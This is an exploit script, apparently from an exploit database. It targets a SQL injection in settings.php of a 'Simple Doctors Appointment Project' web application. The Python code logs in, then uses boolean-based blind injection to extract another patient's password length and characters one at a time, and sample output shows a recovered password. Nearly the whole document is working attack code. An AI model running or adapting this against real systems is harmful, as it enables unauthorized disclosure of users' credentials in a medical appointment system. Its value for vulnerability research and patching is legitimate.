# Exploit Title: SQL Injection on settings.php leading to password disclosure
# Date: 10/6/2022
# Exploit Author: evdaez
# Vendor Homepage: https://www.sourcecodester.com/hashenudara/simple-doctors-appointment-project.html
# Software Link: https://www.sourcecodester.com/hashenudara/simple-doctors-appointment-project.html
# Version: 1.0
# Tested on: XAMPP Windows 10
'''
[+] Successfully logged in.
[+] Cookie - dotc3sq4ao7je90jp8c631j8f4
[+] Guessing password length for user:
[+] Length of password: 8
[+] Guessing user's password:
[+] Password: P@ssw0rd
'''
import requests
import os

def clearScreen():
    currentOS = os.name

    if currentOS == "nt":
        os.system('cls')
    elif currentOS == "posix":
        os.system('clear')

def login():
    data = {
        "useremail": username,
        "userpassword": password
    }

    sess = requests.session() # sess - session
    loginUrl = f"http://{target}/login.php"
    req = sess.post(loginUrl, headers=headers, data=data, proxies=proxies, verify=False) # req - request

    if loginSuccessString in req.text:
        print("[+] Successfully logged in.")
        print(f"[+] Cookie - {sess.cookies['PHPSESSID']}")
        return sess
    else:
        print("[-] Login failed.")
        raise SystemExit

def getPwLength():
    print('[+] Guessing password length for user:')

    for i in range(1, 17, 1):
        sqli_url = f"http://{target}/patient/settings.php?action=view&id=1' and (select length(ppassword) from patient where pid=2)={i} and 'a'='a"
        req = sess.get(sqli_url, headers=headers, proxies=proxies, verify=False)

        if successStringSQLi in req.text:
            print(f"[+] Length of password: {i}")
            break

    return i # Return password length

def getPassword():
    userPassword = ''
    print('[+] Guessing user\'s password:')

    # Outer loop - Encompass the password length
    for i in range(1, pwLength +1, 1):
        # Inner loop - Printable characthers 
        for c in range(33, 127, 1):
            sqli_url = f"http://{target}/patient/settings.php?action=view&id=1' and (select ascii(substring((select ppassword from patient where pid=2 limit 1),{i},1))={c}) and 'a'='a"
            req = sess.get(sqli_url, headers=headers, proxies=proxies, verify=False)

            if successStringSQLi in req.text:
                userPassword += chr(c)
                print(f"[+] Password: {userPassword}", end='\r', flush=False)
                break
    
    print(f"[+] Password: {userPassword}")

if __name__ == "__main__":
    clearScreen()
   
    # For burp
    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"https://127.0.0.1:8080"
    }

    # Simulate real browser header
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36'
    }

    target = "192.168.2.209"
    username = "patient@edoc.com"
    password = "password"

    # It is crucial to know what does a successful login looks like. 
    # As for the SQLi success string, a true would mean that the patient view details isn't empty.
    loginSuccessString = "any idea about doctors"
    successStringSQLi = '0120000000'

    sess = login()
    pwLength = getPwLength()
    getPassword()